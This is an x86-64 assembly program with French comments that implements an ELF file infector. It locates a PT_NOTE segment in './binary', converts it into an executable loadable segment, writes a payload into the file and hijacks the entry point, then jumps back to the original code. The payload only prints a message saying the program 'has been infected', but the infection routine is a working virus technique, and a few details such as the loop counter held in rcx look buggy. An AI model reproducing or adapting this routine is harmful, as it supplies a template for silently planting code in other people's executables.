section .data
    filename db "./binary", 0      ; Chemin du fichier ELF à ouvrir
    msg_open_error db "Une erreur a eu lieu lors de l'ouverture du fichier.", 10, 0
    msg_open_error_len equ $ - msg_open_error
    msg_found db "PT_NOTE segment trouvé!", 10, 0
    msg_found_len equ $ - msg_found
    msg_ptnod db "PT_NOTE devenu ptnode!", 10, 0
    msg_ptnod_len equ $ - msg_ptnod
    msg_not_found db "Aucun segment PT_NOTE trouvé...", 10, 0
    msg_not_found_len equ $ - msg_not_found
    PT_NOTE equ 4                      ; Type de segment PT_NOTE (metadata)
    PT_NODE equ 1                      ; Type de segment PT_NODE (metadata)
    NEW_FLAGS equ 0x7                  ; Nouveaux flags à définir (lecture/écriture/exécution)
    NEW_ENTRY_POINT dq 0x5000          ; Nouvelle adresse de point d'entrée (exemple)

        ; Payload: afficher le message et retourner au point d'entrée d'origine
    payload_start:
    
        mov rax, 1                 ; syscall write
        mov rdi, 1                 ; stdout
        lea rsi, [rel msg]         ; Adresse relative du message
        mov rdx, msg_len           ; Longueur du message
        syscall
        
        mov rax, [rel OLD_ENTRY_POINT] ; charger l'adresse du point d'entrée
        jmp rax;

        mov rax, 60                ; syscall exit
        xor rdi, rdi               ; code de retour 0
        syscall

        msg:
            db "Le programme a été infecté, bravo !", 0xA
        msg_len equ $ - msg        ; Calcul automatique de la longueur

        OLD_ENTRY_POINT dq 0       ; Pour stocker l'ancien point d'entrée
    payload_end:
    payload_len equ payload_end - payload_start


section .bss
    hd_bff resb 64                     ; Buffer pour l'en-tête ELF principal (64 octets pour ELF64)
    pgmhd_bff resb 56                  ; Buffer pour un Program Header (56 octets pour ELF64)
    file_descriptor resq 1             ; Descripteur de fichier (8 octets pour 64 bits)

section .text
    global _start

_start:
    ; Ouvrir le fichier ELF
    mov rdi, filename                  ; Nom du fichier ELF
    mov rsi, 2                         ; Mode lecture/écriture
    mov rax, 2                         ; syscall open
    syscall
    test rax, rax                      ; Vérifier si l'ouverture a réussi
    js .open_error                     ; Si erreur, afficher un message et quitter
    mov [file_descriptor], rax         ; Sauvegarder le descripteur de fichier

    ; Lire l'en-tête ELF principal
    mov rdi, [file_descriptor]         ; Descripteur de fichier
    mov rsi, hd_bff                    ; Buffer pour l'en-tête ELF
    mov rdx, 64                        ; Taille de l'en-tête ELF64
    mov rax, 0                         ; syscall read
    syscall
    test rax, rax                      ; Vérifier si la lecture a réussi
    js .exit                           ; En cas d'échec, quitter

    ; Valider que c'est un fichier ELF
    mov eax, dword [hd_bff]            ; Lire les 4 premiers octets
    cmp eax, 0x464c457f                ; Vérifier 0x7F 'E' 'L' 'F'
    jne .exit                          ; Si ce n'est pas ELF, quitter

    ; Lire les offsets des Program Headers
    mov r10, [hd_bff + 32]             ; e_phoff (offset du Program Header)
    mov rcx, [hd_bff + 56]             ; e_phnum (nombre d'entrées Program Header)

.segment_seeking:
    test rcx, rcx                      ; Condtion de sortie si tous les segments ont été évalués
    jz .not_found                      ; Si oui, segment PT_NOTE non trouvé
    mov rsi, pgmhd_bff                 ; Buffer pour lire un Program Header
    mov rdx, 56                        ; Taille d'une entrée Program Header ELF64
    mov rax, 17                        ; syscall pread (lecture avec offset)
    mov rdi, [file_descriptor]         ; Descripteur de fichier
    mov r8, r10                        ; Offset actuel (r10 contient e_phoff + déplacement)

    syscall
    test rax, rax                      ; Vérifier si la lecture a réussi
    js .exit                           ; En cas d'échec, quitter

    ; Vérifier si le segment est de type PT_NOTE
    mov eax, dword [pgmhd_bff]         ; Charger p_type
    cmp eax, PT_NOTE                   ; Comparer avec PT_NOTE
    je .found                          ; Si trouvé, afficher le message

    ; Passer à l'entrée suivante
    add r10, 56                        ; Offset de l'entrée suivante
    dec rcx                            ; Décrémenter le compteur
    jmp .segment_seeking

.found:
    ; Afficher un message indiquant que PT_NOTE a été trouvé
    mov rdi, 1                         ; Descripteur de sortie (stdout)
    mov rsi, msg_found                 ; Message à afficher
    mov rdx, msg_found_len             ; Longueur du message
    mov rax, 1                         ; syscall write
    syscall

    ; Changer p_type de PT_NOTE à PT_NODE
    mov dword [pgmhd_bff], PT_NODE ; Modifier p_type pour PT_NODE

    ; Vérifier que le changement a bien eu lieu
    mov eax, dword [pgmhd_bff]         ; Charger p_type
    cmp eax, PT_NODE                   ; Vérifier si c'est maintenant PT_NODE
    jne .exit                          ; Si ce n'est pas PT_NODE, quitter

    ; Mettre à jour les valeurs du segment
    mov dword [pgmhd_bff + 4], NEW_FLAGS        ; Mettre à jour p_flags
    mov qword [pgmhd_bff + 32], payload_len     ; Mettre à jour p_filesz
    mov qword [pgmhd_bff + 40], payload_len     ; Mettre à jour p_memsz
    mov qword [pgmhd_bff + 48], 0x1000          ; Mettre à jour p_align

    ; Récupérer l'ancien point d'entrée
    mov rax, [hd_bff + 24]             ; Charger l'adresse dans le registre
    mov [rel OLD_ENTRY_POINT], rax     ; Charger l'adresse dans OLD_ENTRY_POINT

    ; Utiliser la nouvelle valeur du point d'entrée
    mov rax, [NEW_ENTRY_POINT]         ; Charger la valeur dans le registre
    mov [hd_bff + 24], rax             ; Mettre à jour le point d'entrée
    mov [pgmhd_bff +8], rax            ; Mettre à jour l'offset
    mov [pgmhd_bff +16], rax           ; Mettre à jour l'adresse virtuelle

    ; Réécrire le Program Header modifié dans le fichier
    mov rdi, [file_descriptor]         ; Descripteur de fichier
    mov rsi, pgmhd_bff            ; Buffer contenant le Program Header modifié
    mov rdx, 56                        ; Taille d'une entrée Program Header ELF64
    mov rax, 18                        ; syscall write
    syscall
    test rax, rax                      ; Vérifier si l'écriture a réussi
    js .exit                           ; En cas d'échec, quitter

    ; Positionnement pour écrire le payload
    mov rdi, [file_descriptor]         ; Descripteur de fichier
    mov rax, 8                         ; sys_lseek
    mov rsi, [NEW_ENTRY_POINT]         ; Offset où écrire le payload
    xor rdx, rdx
    syscall
    
    ; Écriture du payload
    mov rdi, [file_descriptor]         ; Descripteur de fichier
    mov rax, 1                         ; sys_write
    lea rsi, [rel payload_start]
    mov rdx, payload_len
    syscall

    ; Réécrire le ELF Header modifié dans le fichier
    mov rdi, [file_descriptor]         ; Descripteur de fichier
    mov rsi, hd_bff             ; Buffer contenant le Header modifié
    mov r10, 0                         ; Pas d'offset
    mov rdx, 64                        ; Taille d'une entrée Header ELF64
    mov rax, 18                        ; syscall write
    syscall
    test rax, rax                      ; Vérifier si l'écriture a réussi
    js .exit                           ; En cas d'échec, quitter

    ; Afficher un message indiquant que le changement a bien été effectué
    mov rdi, 1                         ; Descripteur de sortie (stdout)
    mov rsi, msg_ptnod                 ; Message indiquant le changement
    mov rdx, msg_ptnod_len             ; Longueur du message
    mov rax, 1                         ; syscall write
    syscall
    jmp .exit

.not_found:
    ; Afficher un message indiquant qu'aucun PT_NOTE n'a été trouvé
    mov rdi, 1                         ; Descripteur de sortie (stdout)
    mov rsi, msg_not_found             ; Message à afficher
    mov rdx, msg_not_found_len         ; Longueur du message
    mov rax, 1                         ; syscall write
    syscall
    jmp .exit

.open_error:
    ; Afficher un message d'erreur si le fichier ne peut pas être ouvert
    mov rdi, 1                         ; Descripteur de sortie (stdout)
    mov rsi, msg_open_error            ; Message à afficher
    mov rdx, msg_open_error_len        ; Longueur du message
    mov rax, 1                         ; syscall write
    syscall
    jmp .exit

.exit:
    ; Fermer le fichier et quitter proprement
    mov rdi, [file_descriptor]         ; Descripteur de fichier
    mov rax, 3                         ; syscall close
    syscall
    mov rax, 60                        ; syscall exit
    xor rdi, rdi                       ; Code de sortie 0
    syscall